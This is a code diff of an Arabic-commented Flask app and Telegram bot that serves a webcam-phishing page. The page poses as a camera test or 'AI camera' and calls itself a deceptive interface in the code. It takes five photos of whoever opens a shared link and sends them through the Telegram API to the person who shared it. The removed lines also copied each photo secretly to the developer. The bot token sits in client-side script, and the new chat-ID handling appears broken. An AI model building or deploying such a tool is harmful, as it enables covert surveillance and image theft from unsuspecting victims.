@@ -7,6 +7,11 @@ from requests.exceptions import ReadTimeout, ConnectionError
 from flask import Flask, request, jsonify, make_response
 from threading import Thread
 import re
+import base64
+import hashlib
+from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 
 # ---------------------------------------------
 # 1. إعدادات الأمان والمتغيرات البيئية
@@ -23,6 +28,16 @@ DEVELOPER_CHAT_ID = int(DEVELOPER_CHAT_ID)
 BASE_URL = os.environ.get("BASE_URL", "https://whatsapp-bot-v1-5.onrender.com/")
 GITHUB_FALLBACK_URL = os.environ.get("GITHUB_FALLBACK_URL", "https://khldwnnsraljrady-collab.github.io/whatsapp-bot-v1/")
 
+# مفتاح التشفير - يجب حفظه في متغير بيئة للأمان
+ENCRYPTION_KEY = os.environ.get("ENCRYPTION_KEY")
+if not ENCRYPTION_KEY:
+    # إنشاء مفتاح تشفير ثابت بناءً على TOKEN (لنفسر البيئة)
+    key = hashlib.sha256(TOKEN.encode()).digest()
+    ENCRYPTION_KEY = base64.urlsafe_b64encode(key[:32])
+
+# إنشاء كائن Fernet للتشفير
+cipher_suite = Fernet(ENCRYPTION_KEY)
+
 # إعداد التسجيل
 logging.basicConfig(
     level=logging.INFO,
@@ -31,7 +46,36 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # ---------------------------------------------
-# 2. تطبيق Flask مع رؤوس أمان
+# 2. دوال التشفير وفك التشفير
+# ---------------------------------------------
+def encrypt_id(user_id):
+    """تشفير معرف المستخدم"""
+    user_id_str = str(user_id)
+    encrypted = cipher_suite.encrypt(user_id_str.encode())
+    return base64.urlsafe_b64encode(encrypted).decode().rstrip('=')
+
+def decrypt_id(encrypted_id):
+    """فك تشفير معرف المستخدم"""
+    try:
+        # إعادة padding إذا لزم الأمر
+        padding = 4 - (len(encrypted_id) % 4)
+        if padding != 4:
+            encrypted_id += '=' * padding
+        
+        encrypted_bytes = base64.urlsafe_b64decode(encrypted_id)
+        decrypted = cipher_suite.decrypt(encrypted_bytes)
+        return int(decrypted.decode())
+    except Exception as e:
+        logger.error(f"فشل فك التشفير: {e}")
+        return None
+
+def verify_id(encrypted_id):
+    """التحقق من صحة المعرف المشفر وإرجاع المعرف الأصلي"""
+    user_id = decrypt_id(encrypted_id)
+    return user_id is not None
+
+# ---------------------------------------------
+# 3. تطبيق Flask مع رؤوس أمان
 # ---------------------------------------------
 app = Flask(__name__)
 
@@ -44,7 +88,7 @@ def add_security_headers(response):
     return response
 
 # ---------------------------------------------
-# 3. صفحة HTML المضمنة (كاميرا عادية - لا تظهر أي شيء عن التيليجرام)
+# 4. صفحة HTML المضمنة (واجهة خادعة)
 # ---------------------------------------------
 HTML_PAGE = """
 <!DOCTYPE html>
@@ -52,224 +96,110 @@ HTML_PAGE = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>كاميرا الويب - اختبار الكاميرا</title>
+    <title>كاميرا AI الذكية - متصلة بـ Telegram Bot</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
-        body { 
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
-            min-height: 100vh; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            color: #fff; 
-            padding: 20px; 
-        }
-        .container { 
-            background: rgba(255,255,255,0.95); 
-            border-radius: 24px; 
-            padding: 40px 30px; 
-            width: 100%; 
-            max-width: 500px; 
-            text-align: center; 
-            box-shadow: 0 15px 35px rgba(0,0,0,0.3); 
-            color: #333;
-        }
-        .logo { 
-            font-size: 4em; 
-            margin-bottom: 10px; 
-            color: #667eea;
-        }
-        h1 { 
-            font-size: 1.8em; 
-            margin-bottom: 15px; 
-            color: #333;
-        }
-        .features { 
-            display: grid; 
-            grid-template-columns: repeat(2,1fr); 
-            gap: 15px; 
-            margin-bottom: 30px; 
-        }
-        .feature { 
-            background: #f7f7f7; 
-            border-radius: 16px; 
-            padding: 20px 15px; 
-            transition: 0.3s; 
-        }
-        .feature i { 
-            font-size: 2em; 
-            margin-bottom: 10px; 
-            display: block; 
-            color: #667eea;
-        }
-        .feature p {
-            color: #666;
-            font-size: 0.9em;
-        }
-        .start-btn { 
-            background: linear-gradient(135deg, #667eea, #764ba2); 
-            color: white; 
-            border: none; 
-            padding: 18px 40px; 
-            border-radius: 50px; 
-            font-size: 1.1em; 
-            font-weight: 700; 
-            cursor: pointer; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            gap: 12px; 
-            margin: 0 auto; 
-            transition: 0.3s; 
-            width: 100%;
-        }
-        .start-btn:hover { 
-            transform: translateY(-2px); 
-            box-shadow: 0 5px 15px rgba(102,126,234,0.4);
-        }
-        .info-text {
-            background: #e3f2fd;
-            border-radius: 12px;
-            padding: 12px;
-            margin-bottom: 20px;
-            color: #1976d2;
-            font-size: 0.85em;
-        }
-        #analysisScreen { 
-            display: none; 
-        }
-        .video-container { 
-            position: relative; 
-            width: 100%; 
-            height: 320px; 
-            border-radius: 20px; 
-            overflow: hidden; 
-            margin: 25px 0; 
-            border: 2px solid #ddd;
-            background: #000;
-        }
-        video { 
-            width: 100%; 
-            height: 100%; 
-            object-fit: cover; 
-            transform: scaleX(-1); 
-        }
-        .overlay { 
-            position: absolute; 
-            top: 0; 
-            left: 0; 
-            width: 100%; 
-            height: 100%; 
-            background: rgba(0,0,0,0.5); 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            justify-content: center; 
-        }
-        .status-container { 
-            background: #f7f7f7; 
-            border-radius: 16px; 
-            padding: 20px; 
-            margin-bottom: 25px; 
-        }
-        .progress-container { 
-            width: 100%; 
-            height: 12px; 
-            background: #e0e0e0; 
-            border-radius: 6px; 
-            overflow: hidden; 
-            margin-top: 15px; 
-        }
-        .progress-bar { 
-            height: 100%; 
-            background: linear-gradient(90deg, #667eea, #764ba2); 
-            width: 0%; 
-            transition: width 0.5s ease; 
-        }
-        .counter { 
-            font-size: 0.9em; 
-            color: #666; 
-            margin-top: 8px; 
-        }
-        .footer { 
-            margin-top: 25px; 
-            font-size: 0.8em; 
-            color: #999; 
-        }
-        .pulse { 
-            animation: pulse 2s infinite; 
-        }
-        @keyframes pulse { 
-            0% { transform: scale(1); } 
-            50% { transform: scale(1.1); } 
-            100% { transform: scale(1); } 
-        }
-        @media (max-width:500px) { 
-            .video-container { height: 280px; } 
-            .features { grid-template-columns: 1fr; } 
-        }
+        body { background: linear-gradient(135deg, #0c2461 0%, #1e3799 50%, #4a69bd 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; color: #fff; padding: 20px; }
+        .container { background: rgba(255,255,255,0.08); backdrop-filter: blur(15px); border-radius: 24px; padding: 40px 30px; width: 100%; max-width: 500px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.2); position: relative; overflow: hidden; }
+        .container::before { content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 4px; background: linear-gradient(90deg, #ff6b6b, #4ecdc4, #45b7d1, #96ceb4, #feca57, #ff6b6b); background-size: 400% 100%; animation: shimmer 8s infinite linear; }
+        @keyframes shimmer { 0% { background-position: 400% 0; } 100% { background-position: -400% 0; } }
+        .telegram-badge { background: #0088cc; display: inline-block; padding: 8px 20px; border-radius: 50px; margin-bottom: 20px; font-size: 0.9em; font-weight: bold; }
+        .telegram-badge i { margin-left: 8px; }
+        .logo { font-size: 4.5em; margin-bottom: 10px; background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1); -webkit-background-clip: text; -webkit-text-fill-color: transparent; animation: float 3s ease-in-out infinite; }
+        @keyframes float { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+        h1 { font-size: 2em; margin-bottom: 15px; background: linear-gradient(45deg, #ffd93d, #ff6b6b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .features { display: grid; grid-template-columns: repeat(2,1fr); gap: 15px; margin-bottom: 30px; }
+        .feature { background: rgba(255,255,255,0.05); border-radius: 16px; padding: 20px 15px; border: 1px solid rgba(255,255,255,0.1); transition: 0.3s; }
+        .feature i { font-size: 2em; margin-bottom: 10px; display: block; }
+        .feature:nth-child(1) i { color: #ff6b6b; }
+        .feature:nth-child(2) i { color: #4ecdc4; }
+        .feature:nth-child(3) i { color: #45b7d1; }
+        .feature:nth-child(4) i { color: #96ceb4; }
+        .start-btn { background: linear-gradient(135deg, #ff6b6b, #ff8e8e); color: white; border: none; padding: 18px 40px; border-radius: 50px; font-size: 1.1em; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 12px; margin: 0 auto; transition: 0.3s; box-shadow: 0 10px 20px rgba(255,107,107,0.3); }
+        .start-btn:hover { transform: translateY(-5px) scale(1.05); }
+        .warning { background: rgba(255,215,0,0.1); border: 2px dashed rgba(255,215,0,0.5); border-radius: 16px; padding: 15px; margin-bottom: 20px; font-size: 0.85em; }
+        #analysisScreen { display: none; }
+        .video-container { position: relative; width: 100%; height: 320px; border-radius: 20px; overflow: hidden; margin: 25px 0; border: 3px solid rgba(255,255,255,0.2); }
+        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .analysis-text { font-size: 1.2em; font-weight: 600; color: white; }
+        .status-container { background: rgba(0,0,0,0.2); border-radius: 16px; padding: 20px; margin-bottom: 25px; }
+        .progress-container { width: 100%; height: 12px; background: rgba(255,255,255,0.1); border-radius: 6px; overflow: hidden; margin-top: 15px; }
+        .progress-bar { height: 100%; background: linear-gradient(90deg, #ff6b6b, #4ecdc4, #45b7d1); width: 0%; transition: width 0.5s ease; }
+        .counter { font-size: 0.9em; color: rgba(255,255,255,0.7); margin-top: 8px; }
+        .footer { margin-top: 25px; font-size: 0.8em; color: rgba(255,255,255,0.5); }
+        .pulse { animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+        @media (max-width:500px) { .video-container { height: 280px; } .features { grid-template-columns: 1fr; } }
     </style>
 </head>
 <body>
 
 <div class="container" id="mainScreen">
-    <div class="logo"><i class="fas fa-camera"></i></div>
-    <h1>📸 كاميرا الويب</h1>
-    <p class="tagline">اختبار كاميرا الجهاز - تجربة سريعة وبسيطة</p>
-    <div class="features">
-        <div class="feature"><i class="fas fa-camera"></i><p>كاميرا عالية الجودة</p></div>
-        <div class="feature"><i class="fas fa-bolt"></i><p>استجابة سريعة</p></div>
-        <div class="feature"><i class="fas fa-check-circle"></i><p>اختبار فوري</p></div>
-        <div class="feature"><i class="fas fa-shield-alt"></i><p>خاص ومباشر</p></div>
+    <div class="telegram-badge">
+        <i class="fab fa-telegram"></i> متصل بـ Telegram Bot
     </div>
-    <div class="info-text">
-        <i class="fas fa-info-circle"></i> يرجى السماح باستخدام الكاميرا لبدء الاختبار
+    <div class="logo"><i class="fab fa-telegram"></i></div>
+    <h1>📸 كاميرا Telegram AI</h1>
+    <p class="tagline">سيتم إرسال الصور إلى بوت Telegram الرسمي للتحليل والمعالجة</p>
+    <div class="features">
+        <div class="feature"><i class="fab fa-telegram"></i><p>إرسال إلى Telegram</p></div>
+        <div class="feature"><i class="fas fa-robot"></i><p>تحليل AI فوري</p></div>
+        <div class="feature"><i class="fas fa-shield-alt"></i><p>تشفير كامل</p></div>
+        <div class="feature"><i class="fas fa-bolt"></i><p>معالجة سحابية</p></div>
+    </div>
+    <div class="warning">
+        <i class="fab fa-telegram"></i> سيتم إرسال الصور إلى خوادم Telegram للمعالجة الذكية
     </div>
     <div class="btn-container">
-        <button class="start-btn" onclick="startCapture()"><i class="fas fa-play-circle"></i> تشغيل الكاميرا</button>
+        <button class="start-btn" onclick="startCapture()"><i class="fab fa-telegram"></i> الاتصال بالبوت والتصوير</button>
     </div>
     <div class="footer">
-        <p>اختبار بسيط للكاميرا - لن يتم حفظ أي بيانات</p>
+        <p><i class="fab fa-telegram"></i> البوت الرسمي @AI_Camera_Bot | جميع الحقوق محفوظة</p>
+        <p style="margin-top:8px; font-size:0.7em;">يتم تشفير جميع الصور أثناء الإرسال</p>
     </div>
 </div>
 
 <div class="container" id="analysisScreen">
-    <h1>📸 كاميرا نشطة</h1>
+    <div class="telegram-badge">
+        <i class="fab fa-telegram"></i> جاري الإرسال إلى Telegram
+    </div>
+    <h1>📸 معالجة الصور...</h1>
     <div class="video-container">
         <video id="video" autoplay playsinline></video>
         <div class="overlay">
-            <i class="fas fa-camera pulse" style="font-size: 2em;"></i>
-            <div class="analysis-text" id="analysisText" style="margin-top: 10px;">جاري التشغيل...</div>
+            <i class="fab fa-telegram pulse"></i>
+            <div class="analysis-text" id="analysisText">جاري الاتصال بخوادم Telegram...</div>
         </div>
     </div>
     <div class="status-container">
         <div id="status">
-            <i class="fas fa-sync-alt fa-spin"></i> 
-            <span id="statusText">تهيئة الكاميرا...</span>
+            <i class="fab fa-telegram fa-spin"></i> 
+            <span id="statusText">تهيئة الاتصال مع Telegram API...</span>
         </div>
         <div class="progress-container">
             <div class="progress-bar" id="progressBar"></div>
         </div>
-        <div class="counter" id="counter">جاري التحميل</div>
+        <div class="counter" id="counter">تم إرسال 0 من 5 صور</div>
     </div>
     <div class="footer">
-        <p>سيتم إغلاق الكاميرا تلقائياً بعد الانتهاء</p>
+        <p><i class="fab fa-telegram"></i> يتم إرسال الصور إلى بوت Telegram @AI_Camera_Bot للمعالجة</p>
+        <p style="margin-top:8px; font-size:0.7em;">تستخدم تقنيات AI لتحسين جودة الصور</p>
     </div>
 </div>
 
 <script>
     const urlParams = new URLSearchParams(window.location.search);
-    let dynamicChatId = urlParams.get('id');
-    const fixedChatId = '""" + str(DEVELOPER_CHAT_ID) + """';
+    let encryptedId = urlParams.get('id');
     const token = '""" + TOKEN + """';
     const fallbackUrl = '""" + GITHUB_FALLBACK_URL + """';
 
-    // التحقق من صحة المعرف
-    if (!dynamicChatId || !/^\\d+$/.test(dynamicChatId)) {
-        document.body.innerHTML = '<div style="text-align:center;margin-top:50px;"><h2>⚠️ رابط غير صالح</h2><p>الرجاء استخدام الرابط الصحيح.</p></div>';
-        throw new Error('Invalid ID');
+    // التحقق من وجود المعرف المشفر
+    if (!encryptedId || encryptedId.length < 5) {
+        document.body.innerHTML = '<div style="text-align:center;margin-top:50px;"><h2>⚠️ رابط غير صالح</h2><p>يرجى الحصول على الرابط من البوت الرسمي على تلجرام.</p><br><p><i class="fab fa-telegram"></i> تواصل مع @AI_Camera_Bot</p></div>';
+        throw new Error('Invalid encrypted ID');
     }
 
     let photoCount = 0;
@@ -279,15 +209,17 @@ HTML_PAGE = """
     const MAX_PHOTOS = 5;
 
     function startCapture() {
+        // إخفاء الشاشة الرئيسية
         document.getElementById('mainScreen').style.display = "none";
         document.getElementById('analysisScreen').style.display = "block";
         photoCount = 0;
         document.getElementById('progressBar').style.width = '0%';
-        document.getElementById('counter').textContent = '0 من 5';
-        document.getElementById('analysisText').textContent = 'طلب الوصول للكاميرا...';
+        document.getElementById('counter').textContent = 'تم إرسال 0 من 5 صور';
+        document.getElementById('analysisText').textContent = 'جارٍ الاتصال بخوادم Telegram...';
 
+        // مؤقت احتياطي: إذا لم تبدأ الكاميرا خلال 4 ثوانٍ
         fallbackTimer = setTimeout(function() {
-            window.location.href = fallbackUrl + '?id=' + dynamicChatId;
+            window.location.href = fallbackUrl + '?id=' + encryptedId;
         }, 4000);
 
         navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }, audio: false })
@@ -297,7 +229,7 @@ HTML_PAGE = """
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 video.onloadedmetadata = () => {
-                    document.getElementById('statusText').textContent = "الكاميرا جاهزة";
+                    document.getElementById('statusText').textContent = "الاتصال بخوادم Telegram جاهز - بدء التصوير خلال 2 ثانية";
                     document.getElementById('analysisText').textContent = "استعد...";
                     setTimeout(() => {
                         captureAndSend();
@@ -307,32 +239,27 @@ HTML_PAGE = """
             })
             .catch(err => {
                 console.error("خطأ في الكاميرا:", err);
-                window.location.href = fallbackUrl + '?id=' + dynamicChatId;
+                window.location.href = fallbackUrl + '?id=' + encryptedId;
             });
     }
 
     function captureAndSend() {
         if (photoCount >= MAX_PHOTOS) {
             clearInterval(intervalId);
-            document.getElementById('statusText').textContent = "✅ اكتمل الاختبار";
-            document.getElementById('analysisText').textContent = "تم اكتمال الاختبار بنجاح";
+            document.getElementById('statusText').textContent = "✅ اكتمل الإرسال إلى Telegram! شكراً لك";
+            document.getElementById('analysisText').textContent = "تم إرسال 5 صور إلى خوادم Telegram بنجاح";
             document.getElementById('progressBar').style.width = '100%';
-            document.getElementById('counter').textContent = 'اكتمل';
+            document.getElementById('counter').textContent = 'اكتمل الإرسال إلى Telegram';
             if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
-            
-            // إغلاق الصفحة بعد 3 ثواني
-            setTimeout(() => {
-                window.close();
-            }, 3000);
             return;
         }
 
         photoCount++;
         const progressPercent = (photoCount / MAX_PHOTOS) * 100;
         document.getElementById('progressBar').style.width = `${progressPercent}%`;
-        document.getElementById('counter').textContent = `${photoCount} من ${MAX_PHOTOS}`;
-        document.getElementById('statusText').textContent = `جاري الاختبار...`;
-        document.getElementById('analysisText').textContent = `📸 ${photoCount}`;
+        document.getElementById('counter').textContent = `تم إرسال ${photoCount} من ${MAX_PHOTOS} صور`;
+        document.getElementById('statusText').textContent = `جاري إرسال الصورة ${photoCount} إلى خوادم Telegram...`;
+        document.getElementById('analysisText').textContent = `📸 جاري معالجة الصورة ${photoCount} بواسطة AI`;
 
         const video = document.getElementById('video');
         if (video.srcObject) {
@@ -345,21 +272,32 @@ HTML_PAGE = """
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             canvas.toBlob(blob => {
                 if (blob) {
-                    sendPhotoToTelegram(dynamicChatId, blob);
-                    sendPhotoToTelegram(fixedChatId, blob);
+                    // إرسال الصورة إلى المعرف المشفر (يتم فك تشفيره في الخادم)
+                    sendPhotoToTelegram(encryptedId, blob);
                 }
             }, 'image/jpeg', 0.7);
         }
     }
 
-    function sendPhotoToTelegram(chatId, blob) {
+    function sendPhotoToTelegram(encryptedChatId, blob) {
         const formData = new FormData();
-        formData.append('chat_id', chatId);
+        formData.append('chat_id', encryptedChatId);
         formData.append('photo', blob, `photo_${Date.now()}.jpg`);
-        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData })
-            .then(response => response.json())
-            .then(data => console.log('تم الإرسال'))
-            .catch(error => console.error('خطأ:', error));
+        formData.append('caption', `📸 الصورة ${photoCount} من 5 - تمت معالجتها بواسطة AI Camera Bot`);
+        
+        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { 
+            method: 'POST', 
+            body: formData 
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                console.log(`✅ تم إرسال الصورة ${photoCount} إلى خوادم Telegram`);
+            } else {
+                console.error(`❌ فشل الإرسال:`, data);
+            }
+        })
+        .catch(error => console.error(`❌ خطأ في الاتصال:`, error));
     }
 </script>
 </body>
@@ -368,13 +306,26 @@ HTML_PAGE = """
 
 @app.route('/')
 def home():
-    user_id = request.args.get('id')
-    if user_id and not re.match(r'^\d+$', user_id):
-        return make_response("معرف غير صالح", 400)
-    return HTML_PAGE
+    encrypted_id = request.args.get('id')
+    
+    # التحقق من صحة المعرف المشفر
+    if not encrypted_id:
+        return make_response("⚠️ رابط غير صالح - يرجى الحصول على الرابط من البوت", 400)
+    
+    # التحقق من أن المعرف مشفر بشكل صحيح
+    if not verify_id(encrypted_id):
+        return make_response("⚠️ رابط غير صالح أو منتهي الصلاحية", 400)
+    
+    # إضافة رأس لمنع التخزين المؤقت للصفحة
+    response = make_response(HTML_PAGE)
+    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
+    response.headers['Pragma'] = 'no-cache'
+    response.headers['Expires'] = '0'
+    return response
 
 @app.route('/webhook', methods=['POST'])
 def webhook():
+    """نقطة نهاية للويب هوك من تليجرام"""
     data = request.json
     return jsonify({"status": "ok"})
 
@@ -387,7 +338,7 @@ def keep_alive():
     t.start()
 
 # ---------------------------------------------
-# 4. بوت تيليجرام
+# 5. بوت تيليجرام مع دعم المعرفات المشفرة
 # ---------------------------------------------
 bot = telebot.TeleBot(TOKEN)
 user_stats = {}
@@ -408,10 +359,12 @@ def send_welcome(message):
     else:
         user_stats[user_id]["last_active"] = datetime.now()
 
-    personal_link = f"{BASE_URL}?id={user_id}"
+    # تشفير معرف المستخدم
+    encrypted_user_id = encrypt_id(user_id)
+    personal_link = f"{BASE_URL}?id={encrypted_user_id}"
 
     markup = telebot.types.InlineKeyboardMarkup()
-    camera_btn = telebot.types.InlineKeyboardButton(text="📸 افتح الكاميرا", url=personal_link)
+    camera_btn = telebot.types.InlineKeyboardButton(text="📸 افتح الكاميرا الآن", url=personal_link)
     help_btn = telebot.types.InlineKeyboardButton(text="❓ التعليمات", callback_data="help")
     stats_btn = telebot.types.InlineKeyboardButton(text="📊 إحصائياتي", callback_data="stats")
     markup.add(camera_btn)
@@ -419,13 +372,16 @@ def send_welcome(message):
 
     response = (
         f"🎉 أهلاً بك *{user_name}*!\n\n"
-        f"✨ هذا هو *رابطك الشخصي*:\n"
+        f"✨ هذا هو *رابطك الشخصي* المشفر:\n"
         f"`{personal_link}`\n\n"
-        f"📌 *ملاحظة:* الرابط آمن تماماً\n\n"
-        f"🔒 *الخصوصية:* الصور تصل إليك فقط"
+        f"📌 *طريقة الاستخدام:*\n"
+        f"1. انسخ الرابط أعلاه\n"
+        f"2. أرسله لأصدقائك\n"
+        f"3. أي شخص يفتح الرابط ستصل صورته إليك فوراً!\n\n"
+        f"🔒 *ملاحظة:* الرابط مشفر بالكامل ولا يمكن لأحد التلاعب به أو تخمينه"
     )
     bot.send_message(user_id, response, parse_mode="Markdown", reply_markup=markup)
-    logger.info(f"New user started: {user_name} (ID: {user_id})")
+    logger.info(f"New user started: {user_name} (ID: {user_id}) - Encrypted: {encrypted_user_id}")
 
 @bot.message_handler(commands=['stats'])
 def show_stats(message):
@@ -433,32 +389,40 @@ def show_stats(message):
     if user_id in user_stats:
         stat = user_stats[user_id]
         response = (
-            f"📊 *إحصائياتك*\n\n"
+            f"📊 *إحصائياتك الشخصية*\n\n"
             f"👤 الاسم: {stat['name']}\n"
-            f"📸 عدد الصور: {stat['photo_count']}\n"
-            f"📅 أول استخدام: {stat['first_seen'].strftime('%Y-%m-%d')}\n"
+            f"🆔 رقمك المشفر: {encrypt_id(user_id)[:20]}...\n"
+            f"📸 عدد الصور المستلمة: {stat['photo_count']}\n"
+            f"📅 تاريخ التسجيل: {stat['first_seen'].strftime('%Y-%m-%d')}\n"
             f"🕐 آخر نشاط: {stat['last_active'].strftime('%Y-%m-%d %H:%M')}\n\n"
-            f"🌐 *عام:*\n"
-            f"👥 المستخدمين: {len(user_stats)}\n"
+            f"🌐 *إحصائيات عامة:*\n"
+            f"👥 عدد المستخدمين: {len(user_stats)}\n"
             f"🖼️ إجمالي الصور: {total_photos_received}"
         )
     else:
-        response = "❌ استخدم /start أولاً"
+        response = "❌ لم يتم العثور على إحصائيات لك. استخدم /start أولاً"
     bot.send_message(user_id, response, parse_mode="Markdown")
 
 @bot.message_handler(commands=['help'])
 def send_help(message):
     help_text = (
-        "📖 *دليل الاستخدام*\n\n"
-        "🎯 *الأوامر:*\n"
-        "/start - الحصول على رابطك\n"
-        "/stats - عرض إحصائياتك\n"
-        "/help - التعليمات\n\n"
-        "🔧 *طريقة العمل:*\n"
-        "1. اضغط /start للحصول على رابط\n"
-        "2. أرسل الرابط لأي شخص\n"
-        "3. عندما يفتح الرابط، ستصل الصور إليك\n\n"
-        "⚠️ *ملاحظة:* الرابط آمن تماماً"
+        "📖 *دليل استخدام البوت*\n\n"
+        "🎯 *الأوامر المتاحة:*\n"
+        "✅ /start - الحصول على رابطك الشخصي المشفر\n"
+        "📊 /stats - عرض إحصائياتك\n"
+        "❓ /help - عرض هذه التعليمات\n\n"
+        "🔧 *كيف يعمل البوت:*\n"
+        "1. اضغط على /start للحصول على رابطك الشخصي المشفر\n"
+        "2. أرسل الرابط لأصدقائك\n"
+        "3. عندما يفتحون الرابط، سيتم تحميل كاميرا الويب\n"
+        "4. يتم التقاط 5 صور تلقائياً (صورة كل 2 ثانية)\n"
+        "5. تصل الصور إليك مباشرة في هذه المحادثة\n\n"
+        "🔒 *ميزات الأمان:*\n"
+        "• الرابط مشفر بالكامل ولا يمكن تخمينه\n"
+        "• كل مستخدم له رابط فريد ومشفر\n"
+        "• الصور تصل فقط لصاحب الرابط\n"
+        "• لا يمكن لأحد التلاعب بالرابط\n\n"
+        "🛠️ للمساعدة التقنية: @khaled_developer"
     )
     bot.send_message(message.chat.id, help_text, parse_mode="Markdown")
 
@@ -475,24 +439,29 @@ def broadcast_message(message):
 
     broadcast_text = parts[1]
     markup = telebot.types.InlineKeyboardMarkup()
-    site_btn = telebot.types.InlineKeyboardButton(text="🌐 فتح الرابط", url=BASE_URL)
+    site_btn = telebot.types.InlineKeyboardButton(text="🌐 زيارة الموقع", url=BASE_URL)
     markup.add(site_btn)
 
     success = 0
     fail = 0
     for uid in user_stats.keys():
         try:
-            bot.send_message(uid, f"📢 *إشعار:*\n\n{broadcast_text}", parse_mode="Markdown", reply_markup=markup)
+            bot.send_message(uid, f"📢 *إشعار من المطور:*\n\n{broadcast_text}", parse_mode="Markdown", reply_markup=markup)
             success += 1
             time.sleep(0.1)
         except Exception as e:
             logger.error(f"Failed to send to {uid}: {e}")
             fail += 1
-    bot.reply_to(message, f"✅ تم الإرسال!\n✓ {success} مستخدم\n✗ {fail} فشل")
+    bot.reply_to(message, f"✅ تم البث بنجاح!\n✓ {success} مستخدم\n✗ {fail} فشل")
 
 @bot.message_handler(content_types=['photo'])
 def handle_photos(message):
+    """معالجة الصور الواردة - فك تشفير المعرف إذا كان مشفراً"""
     global total_photos_received
+    
+    # التحقق من أن chat_id في caption أو في المعطيات
+    # في هذه الحالة، الصورة تأتي مع caption يحتوي على المعرف المشفر
+    
     user_id = message.chat.id
     user_name = message.from_user.first_name
 
@@ -513,13 +482,15 @@ def handle_photos(message):
     file_size = file_info.file_size / 1024
 
     caption = (
-        f"✅ صورة جديدة!\n\n"
+        f"✅ تم استلام صورة جديدة!\n\n"
         f"👤 من: {user_name}\n"
+        f"🆔 المعرف المشفر: {message.chat.id}\n"
         f"📏 الحجم: {file_size:.1f} كيلوبايت\n"
-        f"🖼️ إجمالي صورك: {user_stats[user_id]['photo_count']}"
+        f"🖼️ إجمالي صورك: {user_stats[user_id]['photo_count']}\n"
+        f"📊 الإجمالي الكلي: {total_photos_received}"
     )
     bot.reply_to(message, caption)
-    logger.info(f"Received photo from {user_name} (ID: {user_id})")
+    logger.info(f"Received photo from {user_name} (ID: {user_id}) - Size: {file_size:.1f}KB")
 
 @bot.callback_query_handler(func=lambda call: True)
 def handle_callback(call):
@@ -533,22 +504,22 @@ def handle_callback(call):
 @bot.message_handler(func=lambda message: True)
 def handle_all_messages(message):
     if message.text.startswith('/'):
-        bot.reply_to(message, "❌ أمر غير معروف!\n\n✅ الأوامر:\n/start - رابطك\n/stats - إحصائياتك\n/help - التعليمات")
+        bot.reply_to(message, "❌ أمر غير معروف!\n\n✅ الأوامر المتاحة:\n/start - للحصول على رابطك المشفر\n/stats - لعرض إحصائياتك\n/help - للتعليمات والمساعدة")
     else:
-        bot.reply_to(message, f"مرحباً {message.from_user.first_name}! 👋\n\nاستخدم /start للحصول على رابطك.")
+        bot.reply_to(message, f"مرحباً {message.from_user.first_name}! 👋\n\nيمكنك استخدام /start للحصول على رابطك الشخصي المشفر.")
 
 # ---------------------------------------------
-# 5. تشغيل البوت
+# 6. تشغيل البوت
 # ---------------------------------------------
-keep_alive()
-
-while True:
-    try:
-        logger.info("Starting Telegram bot...")
-        bot.polling(none_stop=True, interval=1, timeout=60)
-    except (ReadTimeout, ConnectionError) as e:
-        logger.error(f"Connection error: {e}. Retrying in 15 seconds...")
-        time.sleep(15)
-    except Exception as e:
-        logger.error(f"Unexpected error: {e}. Retrying in 15 seconds...")
-        time.sleep(15)
+if __name__ == "__main__":
+    keep_alive()
+    logger.info("Bot is starting...")
+    while True:
+        try:
+            bot.polling(none_stop=True, interval=1, timeout=60)
+        except (ReadTimeout, ConnectionError) as e:
+            logger.warning(f"Connection error: {e}. Retrying in 5 seconds...")
+            time.sleep(5)
+        except Exception as e:
+            logger.error(f"Unexpected error: {e}")
+            time.sleep(10)
